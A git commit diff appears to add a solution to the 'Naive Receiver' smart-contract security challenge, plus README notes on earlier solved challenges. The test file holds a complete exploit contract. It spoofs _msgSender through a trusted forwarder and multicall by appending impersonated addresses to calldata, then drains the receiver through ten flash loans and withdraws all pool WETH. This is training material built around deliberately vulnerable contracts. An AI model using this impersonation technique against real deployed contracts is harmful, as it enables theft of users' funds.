0daf45c2289197a33555bb571ffcbd91f86e295e
Alvin Yap <leaf.alvin@gmail.com>
2024-10-18 17:09:05 +0800

    submit: solved naive receiver

--- README.md
+++ README.md
@@ -10,13 +10,14 @@ In these series of challenges, the vulnerable code will be presented in src/{cha
 
 ## Table of Contents
 
-1. [ABI Smuggling](./test/abi-smuggling/) -> Solved ✅
+1. [ABI Smuggling](./test/abi-smuggling/) -> Solved ✅ => Learned about how to manually construct a calldata to bypass checks
 2. [Side Entrace](./test/side-entrace) -> Solved ✅
 3. [Free Rider](./test/free-rider) -> Solved ✅
 4. [Puppet](./test/puppet) -> Solved ✅ (The test design is flawed as how Foundry's vm increases nonce is different than real life)
 5. [Puppet V2](./test/puppet-v2) -> Solved ✅
 6. [Truster](./test/truster/) -> Solved ✅ Easiest so far
 7. [Selfie](./test/selfie/) -> Solved ✅
-8. [Compromised](./test/compromised/) -> Solved ✅
+8. [Compromised](./test/compromised/) -> Solved ✅ => Not so much of a code bug but rather a leak
 9. [Backdoor](./test/backdoor/) -> Solved ✅ => Indeed something new, forced to look into ProxyWallet's inplementation code
-10. [Unstoppable](./test/unstoppable/) -> Solved ✅ => The most LOL, upon seeing this ```if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance();``` transferred 10 tokens the the vault and it halts 
+10. [Unstoppable](./test/unstoppable/) -> Solved ✅ => The most LOL, upon seeing this ```if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance();``` transferred 10 tokens to the vault and it halts. Learned about ERC4626, good thing.
+11. [Naive Receiver](./test/naive-receiver/) -> Learned more details about meta-transactions, relayers ERC2771, and multicall
--- test/naive-receiver/NaiveReceiver.t.sol
+++ test/naive-receiver/NaiveReceiver.t.sol
@@ -6,6 +6,8 @@ import {Test, console} from "forge-std/Test.sol";
 import {NaiveReceiverPool, Multicall, WETH} from "../../src/naive-receiver/NaiveReceiverPool.sol";
 import {FlashLoanReceiver} from "../../src/naive-receiver/FlashLoanReceiver.sol";
 import {BasicForwarder} from "../../src/naive-receiver/BasicForwarder.sol";
+// import {ECDSA} from "solady/utils/ECDSA.sol";
+
 
 contract NaiveReceiverChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -76,7 +78,24 @@ contract NaiveReceiverChallenge is Test {
     /**
      * CODE YOUR SOLUTION HERE
      */
-    function test_naiveReceiver() public checkSolvedByPlayer {}
+    function test_naiveReceiver() public checkSolvedByPlayer {
+        // ********************
+        // 1. Our target is to deain receiver and pool's weth
+        // 2. Upon brief inspection, reached a conclusion that FlashLoanReceiver.sol and Multicall is generally safe.
+        // 3. Since this contract supports meta-transactions, and has a multicall(), I would assume that the exploitation
+        // is related to it.
+        // 4. The implementation of _msgSender in NaiveReceiverPool looks odd, and rings a huge bell
+        // 5. The support of forwarder + multicall() + the implementation of _msgSender() for meta-transactions compatibility gives us
+        // chances to maninupulate and pretend to be someone.
+        // 6. If so, in order to drain receiver's 10 ETH, we just call flashloan on behalf of receiver for 10 times, and the 10 ETH will be drained.
+        // 7. And then, we just pretend to be deployer, and withdraw it to the recovery address
+        // 8. Since even we use multicall to call multiple functions on pool, Multicall contracts delegates the call to the Pool itself, makes the
+        // msg.sender always will be the forwarder, thus fullfil (msg.sender == trustedForwarder && msg.data.length >= 20);
+        // 9. Now let's code the solution out:
+        // ********************
+
+        new PoolExploiter(pool, weth, receiver, forwarder, recovery, deployer, playerPk);
+    }
 
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
@@ -93,5 +112,158 @@ contract NaiveReceiverChallenge is Test {
 
         // All funds sent to recovery account
         assertEq(weth.balanceOf(recovery), WETH_IN_POOL + WETH_IN_RECEIVER, "Not enough WETH in recovery account");
+    }
+}
+
+contract PoolExploiter is Test {
+    // ********************
+    // 1. Our target is to deain receiver and pool's weth
+    // 2. Upon brief inspection, reached a conclusion that FlashLoanReceiver.sol and Multicall is generally safe.
+    // 3. Since this contract supports meta-transactions, and has a multicall(), I would assume that the exploitation
+    // is related to it.
+    // 4. The implementation of _msgSender in NaiveReceiverPool looks odd, and rings a huge bell
+    // 5. The support of forwarder + multicall() + the implementation of _msgSender() for meta-transactions compatibility gives us
+    // chances to maninupulate and pretend to be someone.
+    // 6. If so, in order to drain receiver's 10 ETH, we just call flashloan on behalf of receiver for 10 times, and the 10 ETH will be drained.
+    // 7. And then, we just pretend to be deployer, and withdraw it to the recovery address
+    // 8. Since even we use multicall to call multiple functions on pool, Multicall contracts delegates the call to the Pool itself, makes the
+    // msg.sender always will be the forwarder, thus fullfil (msg.sender == trustedForwarder && msg.data.length >= 20);
+    // 9. Several concepts: say for a function approve(address, uint256), if is encoded with function selector + address + uint256, and append gibberish
+    // bytes behind it, it will still be correctly interprated.
+    // 9. Now let's code the solution out:
+    // ********************
+
+    // struct Request {
+    //     address from;
+    //     address target;
+    //     uint256 value;
+    //     uint256 gas;
+    //     uint256 nonce;
+    //     bytes data;
+    //     uint256 deadline;
+    // }
+
+    // We need 12 transactions:
+    // 1 transation to deposit on behalf of player
+    // 1 transaction to withdraw on behalf of player
+    // 10 flash loan transactions to pretend to be be receiver
+
+    address owner;
+    NaiveReceiverPool pool;
+    WETH weth;
+    FlashLoanReceiver receiver;
+    BasicForwarder forwarder;
+    address recovery;
+    address deployer;
+    uint256 playerPk;
+
+    constructor(
+        NaiveReceiverPool _pool,
+        WETH _weth,
+        FlashLoanReceiver _receiver,
+        BasicForwarder _forwarder,
+        address _recovery,
+        address _deployer,
+        uint256 _playerPk
+    ) {
+        owner = msg.sender;
+        pool = _pool;
+        weth = _weth;
+        receiver = _receiver;
+        forwarder = _forwarder;
+        recovery = _recovery;
+        deployer = _deployer;
+        playerPk = _playerPk;
+
+        // bytes container for multicall use
+        bytes[] memory multicallDataBody = new bytes[](12);
+
+        // deposit data construction
+        bytes memory depositData = abi.encodeWithSelector(pool.deposit.selector);
+        multicallDataBody[0] = depositData;
+
+        // malicious flash loan data construction
+        bytes memory flashLoanData =
+            abi.encodeWithSelector(pool.flashLoan.selector, receiver, address(weth), 1 ether, "0x");
+        bytes memory maliciousFlashLoanData = abi.encodePacked(flashLoanData, address(receiver));
+
+        for (uint256 i = 1; i < 11; i++) {
+            multicallDataBody[i] = maliciousFlashLoanData;
+        }
+
+        // malicious withdrawal data construction
+        bytes memory withdrawData = abi.encodeWithSelector(pool.withdraw.selector, 1010 ether, recovery);
+        bytes memory maliciousWithdrawData = abi.encodePacked(withdrawData, deployer);
+        multicallDataBody[11] = maliciousWithdrawData;
+
+        // multicall data construction
+        bytes memory multicallData = abi.encodeWithSelector(Multicall.multicall.selector, multicallDataBody);
+
+        // Sign EIP-712
+        BasicForwarder.Request memory request = BasicForwarder.Request({
+            from: owner,
+            target: address(pool),
+            value: 0,
+            gas: gasleft(), // or a specific gas limit
+            nonce: forwarder.nonces(owner),
+            data: multicallData,
+            deadline: block.timestamp + 1
+        });
+
+        bytes32 domainSeparator = forwarder.domainSeparator();
+        bytes32 dataHash = forwarder.getDataHash(request);
+        bytes32 digest = ECDSA.toTypedDataHash(domainSeparator, dataHash);
+
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, digest);
+        bytes memory signature = abi.encodePacked(r, s, v);
+
+        bool success = forwarder.execute{value: 0}(request, signature);
+    }
+
+    receive() external payable {}
+}
+
+/**
+ * @dev Elliptic Curve Digital Signature Algorithm (ECDSA) operations.
+ *
+ * These functions can be used to verify that a message was signed by the holder
+ * of the private keys of a given address.
+ */
+library ECDSA {
+    /**
+     * @dev Overload of {ECDSA-recover} that receives the `v`,
+     * `r` and `s` signature fields separately.
+     */
+    function recover(bytes32 hash, uint8 v, bytes32 r, bytes32 s) internal pure returns (address) {
+        // EIP-2 still allows signature malleability for ecrecover(). Remove this possibility and make the signature
+        // unique. Appendix F in the Ethereum Yellow paper (https://ethereum.github.io/yellowpaper/paper.pdf), defines
+        // the valid range for s in (281): 0 < s < secp256k1n ÷ 2 + 1, and for v in (282): v ∈ {27, 28}. Most
+        // signatures from current libraries generate a unique signature with an s-value in the lower half order.
+        //
+        // If your library generates malleable signatures, such as s-values in the upper range, calculate a new s-value
+        // with 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141 - s1 and flip v from 27 to 28 or
+        // vice versa. If your library also generates signatures with 0/1 for v instead 27/28, add 27 to v to accept
+        // these malleable signatures as well.
+        require(uint256(s) <= 0x7FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF5D576E7357A4501DDFE92F46681B20A0, "ISS");
+        require(v == 27 || v == 28, "ISV");
+
+        // If the signature is valid (and not malleable), return the signer address
+        address signer = ecrecover(hash, v, r, s);
+        require(signer != address(0), "IS");
+
+        return signer;
+    }
+
+    /**
+     * @dev Returns an Ethereum Signed Typed Data, created from a
+     * `domainSeparator` and a `structHash`. This produces hash corresponding
+     * to the one signed with the
+     * https://eips.ethereum.org/EIPS/eip-712[`eth_signTypedData`]
+     * JSON-RPC method as part of EIP-712.
+     *
+     * See {recover}.
+     */
+    function toTypedDataHash(bytes32 domainSeparator, bytes32 structHash) internal pure returns (bytes32) {
+        return keccak256(abi.encodePacked("\x19\x01", domainSeparator, structHash));
     }
 }
